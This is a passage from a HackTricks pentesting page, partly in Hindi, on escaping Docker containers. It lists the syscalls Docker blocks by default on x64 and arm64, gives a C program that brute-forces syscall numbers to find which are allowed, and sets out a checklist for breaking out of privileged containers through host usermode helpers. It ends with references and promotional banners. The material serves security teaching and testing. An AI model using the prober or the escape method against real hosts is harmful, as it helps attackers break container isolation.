* **नेमस्पेस:** प्रक्रिया को नेमस्पेस के माध्यम से अन्य प्रक्रियाओं से पूरी तरह से अलग करना चाहिए, इसलिए हम नेमस्पेस के कारण अन्य प्रोसेसों के साथ संवाद करने से बच नहीं सकते (डिफ़ॉल्ट रूप से IPC, यूनिक्स सॉकेट, नेटवर्क सेवाएं, D-Bus, अन्य प्रोसेस के `/proc` के माध्यम से संवाद नहीं कर सकते)।
* **रूट उपयोगकर्ता:** डिफ़ॉल्ट रूप से प्रक्रिया चलाने वाला उपयोगकर्ता रूट उपयोगकर्ता होता है (हालांकि इसकी प्रिविलेजेज़ सीमित होती है)।
* **क्षमताएँ:** Docker निम्नलिखित क्षमताएं छोड़ता है: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **सिसकॉल्स:** ये सिसकॉल्स वे हैं जिन्हें **रूट उपयोगकर्ता कॉल नहीं कर सकेगा** (क्षमताओं की कमी + सेकॉम्प के कारण)। बाकी सिसकॉल्स का उपयोग भागने की कोशिश करने के लिए किया जा सकता है।

{% tabs %}
{% tab title="x64 सिसकॉल्स" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% tab title="arm64 syscalls" %}

आर्म64 सिस्कॉल्स
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% tab title="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
